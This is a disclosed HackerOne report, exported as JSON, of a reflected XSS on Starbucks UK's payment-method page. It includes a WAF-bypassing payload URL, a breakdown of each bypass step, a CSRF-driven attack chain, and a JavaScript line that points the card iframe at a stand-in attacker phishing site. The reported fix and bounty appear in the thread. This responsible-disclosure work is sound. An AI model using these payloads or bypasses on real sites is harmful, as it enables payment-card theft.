{"id":227486,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMjc0ODY=","url":"https://hackerone.com/reports/227486","title":"XSS on https://www.starbucks.co.uk (can lead to credit card theft) (/shop/paymentmethod)","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2017-05-10T13:28:32.386Z","submitted_at":"2017-05-10T13:28:32.386Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"bayotop","url":"/bayotop","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/036/633/10a34b6ba8511f5ae6c9664bafcd04aeb25982f8_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1989,"url":"https://hackerone.com/starbucks","handle":"starbucks","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Starbucks","twitter_handle":"Starbucks","website":"http://www.starbucks.com","about":"Inspiring and nurturing the human spirit -- one person, one cup, one neighborhood at a time."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2018-05-22T21:50:20.339Z","bug_reporter_agreed_on_going_public_at":"2018-05-02T07:40:58.511Z","team_member_agreed_on_going_public_at":"2018-05-22T21:50:20.228Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\n\n**Steps to reproduce:**\n\n0. Run Firefox (these steps *require* Firefox).\n1. Log in on https://www.starbucks.co.uk/account/signin\n2. Go to https://www.starbucks.co.uk/shop/card/egift and add any card to your basket.\n3. Go to https://www.starbucks.co.uk/shop/paymentmethod?==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton\n4. After the page finishes loading click the \"Checkout\" title.\n5. A confirmation prompt is shown showing the current domain.\n\n**Note** that these steps can be automated due to missing CSRF protection on the \"Add to Basket\" option. Effectively, all a user has to do is to load a page which is under attacker's control. I set up an example: http://bayo.rocks/f42e32a3-9e9a-4be0-8cfb-4b5d766b97d0/sbux_poc.html (this link is private).\n\n**Description:**\n\nI'll explain what is going on and why this works. First, take a look at https://www.starbucks.co.uk/shop/card/egift?reflected \nLooking at the source code you see the whole URL is reflected in a link tag. \n\n```html\n\u003clink rel=\"canonical\" href=\"https://www.starbucks.co.uk/shop/card/egift?reflected\" /\u003e\n```\nTrying to inject malicious code seems to be blocked by a WAF. However, all checks can be eventually bypassed to inject arbitrary attributes, e.g. https://www.starbucks.co.uk/shop/card/egift?%u0022%20id=%u0022injected results in: \n\n```html\n\u003clink rel=\"canonical\" href=\"https://www.starbucks.co.uk/shop/card/egift?\" id=\"injected\" /\u003e\n```\n\nThis works on every page (!) site-wide. However, I am not aware of any technique to get arbitrary JS execution at this point. However, there is a handy [script](https://www.starbucks.co.uk/static/resource/shop_js/676938998_en-GB) loaded into the page that does the following:\n\n```javascript\n$(\"#checkout\").bind(\"click\", function(e) {\n    $(\"#checkoutButton\").trigger(\"click\")\n});\n```\n\nYou see where this is going. In case I find a page that has an element with the id **checkout**, I can inject **id=\"checkoutButton\" onclick=\"malicous_js\"** to the above link element and the injected JS will be executed once the **checkout** element is clicked. \n\nExactly such a page is https://www.starbucks.co.uk/shop/paymentmethod (requires authentication). You can see the credit card form being loaded on this page. Luckily, it is loaded from a different origin so the form data can't be read using the injected JS. However, a determined attacker can easily set up a exact-looking page and change the iframe's content to steal the victim's credit card information:\n\n```javascript\ndocument.getElementById('payment-method-iframe').contentWindow.location.href = 'https://sbuxphishingsiteunderattackerscontrol.com';\n```\n\n**Note** that the **checkout** element is actually **\u003cbody\u003e** so there is plenty of space where the user can click to execute the malicious JS.\n\nTake into consideration that his could work in both IE and Chrome and the only thing preventing the PoC are the browsers' built in XSS protections. I am working on a bypass, but unfortunately I am not quite there, yet.\n\nTo sum up, I'll breakdown the injection from the PoC (==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton):\n\n1. **==** -\u003e used to trick the [query string parsing code](https://www.starbucks.co.uk/static/resource/shop_js/676938998_en-GB) that is calling decodeURIcomponent(). Otherwise decodeURIcomponent(\"%u0022\") throws an exception resulting in the \"checkout bind\" never being called.\n2. **%u0022** -\u003e bypasses the WAF that is causing a 404 when the query contains \"%22\".\n3. **a%20onclick=** -\u003e allows to inject any on*= handlers. Otherwise a server error is returned when a blacklisted onhandler is followed by an equals sign in the query.\n4. **confirm(/-/g** -\u003e the WAF seems to dislike confirm(), alert() and so on. Adding a '/' after the left bracket makes him happy again.\n5. **+this.ownerDocument.domain)** -\u003e the WAF doesn't like \"document\".\n\n**Impact**\n\nAs mentioned, an attacker can easily trick users into disclosing their credit data. The victims might not even realize that they were tricked and their privacy was compromised. All they know is they entered their data on \"https://starbucks.co.uk\" as usual. Note that other \"typical\" possible ways to compromise the victims using XSS (BeEF hooks etc.) are, of course, still applicable.\n\n**Recommendation**\n\nCorrectly encode user input before rendering it back into the page. You shouldn't rely only on your WAF / custom blacklisting to protect you. Consider auditing yout site and adding CSRF protection to actions like \"Add to Basket\". You might also consider fixing the bypasses I mentioned. ","vulnerability_information_html":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eSteps to reproduce:\u003c/strong\u003e\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eRun Firefox (these steps \u003cem\u003erequire\u003c/em\u003e Firefox).\u003c/li\u003e\n\u003cli\u003eLog in on \u003ca title=\"https://www.starbucks.co.uk/account/signin\" href=\"/redirect?url=https%3A%2F%2Fwww.starbucks.co.uk%2Faccount%2Fsignin\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.starbucks.co.uk/account/signin\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eGo to \u003ca title=\"https://www.starbucks.co.uk/shop/card/egift\" href=\"/redirect?url=https%3A%2F%2Fwww.starbucks.co.uk%2Fshop%2Fcard%2Fegift\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.starbucks.co.uk/shop/card/egift\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and add any card to your basket.\u003c/li\u003e\n\u003cli\u003eGo to \u003ca title=\"https://www.starbucks.co.uk/shop/paymentmethod?==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton\" href=\"/redirect?url=https%3A%2F%2Fwww.starbucks.co.uk%2Fshop%2Fpaymentmethod%3F%3D%3D%25u0022a%2520onclick%3Dconfirm%28%2F-%2Fg%2Bthis.ownerDocument.domain%29%2520id%3D%25u0022checkoutButton\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.starbucks.co.uk/shop/paymentmethod?==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eAfter the page finishes loading click the \u0026quot;Checkout\u0026quot; title.\u003c/li\u003e\n\u003cli\u003eA confirmation prompt is shown showing the current domain.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003e\u003cstrong\u003eNote\u003c/strong\u003e that these steps can be automated due to missing CSRF protection on the \u0026quot;Add to Basket\u0026quot; option. Effectively, all a user has to do is to load a page which is under attacker\u0026#39;s control. I set up an example: \u003ca title=\"http://bayo.rocks/f42e32a3-9e9a-4be0-8cfb-4b5d766b97d0/sbux_poc.html\" href=\"/redirect?url=http%3A%2F%2Fbayo.rocks%2Ff42e32a3-9e9a-4be0-8cfb-4b5d766b97d0%2Fsbux_poc.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://bayo.rocks/f42e32a3-9e9a-4be0-8cfb-4b5d766b97d0/sbux_poc.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e (this link is private).\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ll explain what is going on and why this works. First, take a look at \u003ca title=\"https://www.starbucks.co.uk/shop/card/egift?reflected\" href=\"/redirect?url=https%3A%2F%2Fwww.starbucks.co.uk%2Fshop%2Fcard%2Fegift%3Freflected\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.starbucks.co.uk/shop/card/egift?reflected\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u003cbr\u003e\nLooking at the source code you see the whole URL is reflected in a link tag. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;link\u003c/span\u003e \u003cspan class=\"na\"\u003erel=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;canonical\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://www.starbucks.co.uk/shop/card/egift?reflected\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTrying to inject malicious code seems to be blocked by a WAF. However, all checks can be eventually bypassed to inject arbitrary attributes, e.g. \u003ca title=\"https://www.starbucks.co.uk/shop/card/egift?%u0022%20id=%u0022injected\" href=\"/redirect?url=https%3A%2F%2Fwww.starbucks.co.uk%2Fshop%2Fcard%2Fegift%3F%25u0022%2520id%3D%25u0022injected\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.starbucks.co.uk/shop/card/egift?%u0022%20id=%u0022injected\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e results in: \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;link\u003c/span\u003e \u003cspan class=\"na\"\u003erel=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;canonical\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ehref=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://www.starbucks.co.uk/shop/card/egift?\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eid=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;injected\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis works on every page (!) site-wide. However, I am not aware of any technique to get arbitrary JS execution at this point. However, there is a handy \u003ca href=\"/redirect?url=https%3A%2F%2Fwww.starbucks.co.uk%2Fstatic%2Fresource%2Fshop_js%2F676938998_en-GB\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003escript\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e loaded into the page that does the following:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e#checkout\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003ebind\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eclick\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ee\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e#checkoutButton\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003etrigger\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eclick\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eYou see where this is going. In case I find a page that has an element with the id \u003cstrong\u003echeckout\u003c/strong\u003e, I can inject \u003cstrong\u003eid=\u0026quot;checkoutButton\u0026quot; onclick=\u0026quot;malicous_js\u0026quot;\u003c/strong\u003e to the above link element and the injected JS will be executed once the \u003cstrong\u003echeckout\u003c/strong\u003e element is clicked. \u003c/p\u003e\n\n\u003cp\u003eExactly such a page is \u003ca title=\"https://www.starbucks.co.uk/shop/paymentmethod\" href=\"/redirect?url=https%3A%2F%2Fwww.starbucks.co.uk%2Fshop%2Fpaymentmethod\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.starbucks.co.uk/shop/paymentmethod\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e (requires authentication). You can see the credit card form being loaded on this page. Luckily, it is loaded from a different origin so the form data can\u0026#39;t be read using the injected JS. However, a determined attacker can easily set up a exact-looking page and change the iframe\u0026#39;s content to steal the victim\u0026#39;s credit card information:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003egetElementById\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003epayment-method-iframe\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003econtentWindow\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehref\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ehttps://sbuxphishingsiteunderattackerscontrol.com\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eNote\u003c/strong\u003e that the \u003cstrong\u003echeckout\u003c/strong\u003e element is actually \u003cstrong\u003e\u0026lt;body\u0026gt;\u003c/strong\u003e so there is plenty of space where the user can click to execute the malicious JS.\u003c/p\u003e\n\n\u003cp\u003eTake into consideration that his could work in both IE and Chrome and the only thing preventing the PoC are the browsers\u0026#39; built in XSS protections. I am working on a bypass, but unfortunately I am not quite there, yet.\u003c/p\u003e\n\n\u003cp\u003eTo sum up, I\u0026#39;ll breakdown the injection from the PoC (==%u0022a%20onclick=confirm(/-/g+this.ownerDocument.domain)%20id=%u0022checkoutButton):\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\n\u003cstrong\u003e==\u003c/strong\u003e -\u0026gt; used to trick the \u003ca href=\"/redirect?url=https%3A%2F%2Fwww.starbucks.co.uk%2Fstatic%2Fresource%2Fshop_js%2F676938998_en-GB\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003equery string parsing code\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e that is calling decodeURIcomponent(). Otherwise decodeURIcomponent(\u0026quot;%u0022\u0026quot;) throws an exception resulting in the \u0026quot;checkout bind\u0026quot; never being called.\u003c/li\u003e\n\u003cli\u003e\n\u003cstrong\u003e%u0022\u003c/strong\u003e -\u0026gt; bypasses the WAF that is causing a 404 when the query contains \u0026quot;%22\u0026quot;.\u003c/li\u003e\n\u003cli\u003e\n\u003cstrong\u003ea%20onclick=\u003c/strong\u003e -\u0026gt; allows to inject any on*= handlers. Otherwise a server error is returned when a blacklisted onhandler is followed by an equals sign in the query.\u003c/li\u003e\n\u003cli\u003e\n\u003cstrong\u003econfirm(/-/g\u003c/strong\u003e -\u0026gt; the WAF seems to dislike confirm(), alert() and so on. Adding a \u0026#39;/\u0026#39; after the left bracket makes him happy again.\u003c/li\u003e\n\u003cli\u003e\n\u003cstrong\u003e+this.ownerDocument.domain)\u003c/strong\u003e -\u0026gt; the WAF doesn\u0026#39;t like \u0026quot;document\u0026quot;.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003e\u003cstrong\u003eImpact\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eAs mentioned, an attacker can easily trick users into disclosing their credit data. The victims might not even realize that they were tricked and their privacy was compromised. All they know is they entered their data on \u0026quot;\u003ca title=\"https://starbucks.co.uk\" href=\"/redirect?url=https%3A%2F%2Fstarbucks.co.uk\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://starbucks.co.uk\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026quot; as usual. Note that other \u0026quot;typical\u0026quot; possible ways to compromise the victims using XSS (BeEF hooks etc.) are, of course, still applicable.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eRecommendation\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eCorrectly encode user input before rendering it back into the page. You shouldn\u0026#39;t rely only on your WAF / custom blacklisting to protect you. Consider auditing yout site and adding CSRF protection to actions like \u0026quot;Add to Basket\u0026quot;. You might also consider fixing the bypasses I mentioned. \u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-06-01T07:40:58.585Z","allow_singular_disclosure_after":-81379341.62945525,"singular_disclosure_allowed":true,"vote_count":25,"voters":["sp1d3rs","europa","wh0ru","foobar7","mvc","bl4de","bogdantcaciuc","spam404","emitrani","dilawer01","and 15 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":{"databaseId":13017,"asset_type":"URL","asset_identifier":"www.starbucks.co.uk","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1666205,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-10T17:18:50.284Z","updated_at":"2017-05-10T17:18:50.284Z","additional_data":{"old_title":"XSS on https://www.starbucks.co.uk (can lead to credit card theft)","new_title":"XSS on https://www.starbucks.co.uk (can lead to credit card theft) (/shop/paymentmethod)"},"actor":{"username":"sharpie","cleared":false,"url":"/sharpie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/093/272/b7429121474103e01ac6fabf477ddb52ed91556d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1666206,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for sending this in! We are currently reviewing this submission and we'll notify you once we have more information to share with you. \n","markdown_message":"\u003cp\u003eThanks for sending this in! We are currently reviewing this submission and we\u0026#39;ll notify you once we have more information to share with you. \u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-10T17:18:58.181Z","updated_at":"2017-05-10T17:18:58.181Z","actor":{"username":"sharpie","cleared":false,"url":"/sharpie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/093/272/b7429121474103e01ac6fabf477ddb52ed91556d_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1674473,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-15T14:30:27.259Z","updated_at":"2017-05-15T14:30:27.259Z","actor":{"username":"siren","cleared":false,"url":"/siren","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/496/422aa228af5a54db16d191c4bed22c984a6429f2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":1726335,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nAny updates? In the recently disclosed issue https://hackerone.com/reports/177472 you state that you typically try to award bounties at triage, or shortly after. Is this entry different or is the decision delayed for another reason? Thanks.  ","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eAny updates? In the recently disclosed issue \u003ca title=\"https://hackerone.com/reports/177472\" href=\"https://hackerone.com/reports/177472\"\u003ehttps://hackerone.com/reports/177472\u003c/a\u003e you state that you typically try to award bounties at triage, or shortly after. Is this entry different or is the decision delayed for another reason? Thanks.  \u003c/p\u003e\n","automated_response":false,"created_at":"2017-06-02T18:22:07.960Z","updated_at":"2017-06-02T18:22:07.960Z","actor":{"username":"bayotop","cleared":false,"url":"/bayotop","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/633/10a34b6ba8511f5ae6c9664bafcd04aeb25982f8_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1734884,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @bayotop,\n\nThis should now be resolved.  Can you re-test and confirm?\n\nAs for your question about bounties being awarded at triage - yes, we try to do this at triage or shortly thereafter but this can sometimes be delayed as was the case this time.  For future qualifying reports, you should see more timely bounty awards.\n\n\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/bayotop\"\u003e@bayotop\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThis should now be resolved.  Can you re-test and confirm?\u003c/p\u003e\n\n\u003cp\u003eAs for your question about bounties being awarded at triage - yes, we try to do this at triage or shortly thereafter but this can sometimes be delayed as was the case this time.  For future qualifying reports, you should see more timely bounty awards.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-06-06T14:41:32.695Z","updated_at":"2017-06-06T14:41:32.695Z","actor":{"username":"siren","cleared":false,"url":"/siren","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/496/422aa228af5a54db16d191c4bed22c984a6429f2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"bayotop","url":"/bayotop"},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":1734885,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-06-06T14:41:51.090Z","updated_at":"2017-06-06T14:41:51.090Z","actor":{"url":"/starbucks","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Starbucks"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"starbucks","collaborator":{"username":"bayotop","url":"/bayotop"},"actor_is_team_member":true,"actor_is_concealed_member":true},{"id":1734930,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @siren, \n\nI am not able to reproduce anymore as the WAF will redirect requests containing ```%u0022``` (404). I am also happy to see that the \"Add to Basket\" option is now protected against CSRF.\n\nHowever, I am not quite able to verify whether the ```\"``` character is correctly encoded in the initial injection point. If not, future bypasses might be discovered making this exploitable again.\n\nThe bounty is much appreciated. Thanks.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/siren\"\u003e@siren\u003c/a\u003e, \u003c/p\u003e\n\n\u003cp\u003eI am not able to reproduce anymore as the WAF will redirect requests containing \u003ccode\u003e%u0022\u003c/code\u003e (404). I am also happy to see that the \u0026quot;Add to Basket\u0026quot; option is now protected against CSRF.\u003c/p\u003e\n\n\u003cp\u003eHowever, I am not quite able to verify whether the \u003ccode\u003e\u0026quot;\u003c/code\u003e character is correctly encoded in the initial injection point. If not, future bypasses might be discovered making this exploitable again.\u003c/p\u003e\n\n\u003cp\u003eThe bounty is much appreciated. Thanks.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-06-06T15:01:06.216Z","updated_at":"2017-06-06T15:01:55.075Z","actor":{"username":"bayotop","cleared":false,"url":"/bayotop","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/633/10a34b6ba8511f5ae6c9664bafcd04aeb25982f8_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1735070,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for confirming @bayotop!\n","markdown_message":"\u003cp\u003eThanks for confirming \u003ca href=\"/bayotop\"\u003e@bayotop\u003c/a\u003e!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-06-06T16:02:51.034Z","updated_at":"2017-06-06T16:02:51.034Z","actor":{"username":"siren","cleared":false,"url":"/siren","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/496/422aa228af5a54db16d191c4bed22c984a6429f2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":2688744,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-02T07:40:58.541Z","updated_at":"2018-05-02T07:40:58.541Z","first_to_agree":true,"actor":{"username":"bayotop","cleared":false,"url":"/bayotop","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/633/10a34b6ba8511f5ae6c9664bafcd04aeb25982f8_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2780981,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-22T21:50:20.264Z","updated_at":"2018-05-22T21:50:20.264Z","actor":{"username":"overice","cleared":false,"url":"/overice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/161/018/993b2d44b7dea7bd979efa3030b9456f04690408_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2780982,"is_internal":false,"editable":false,"type":"Act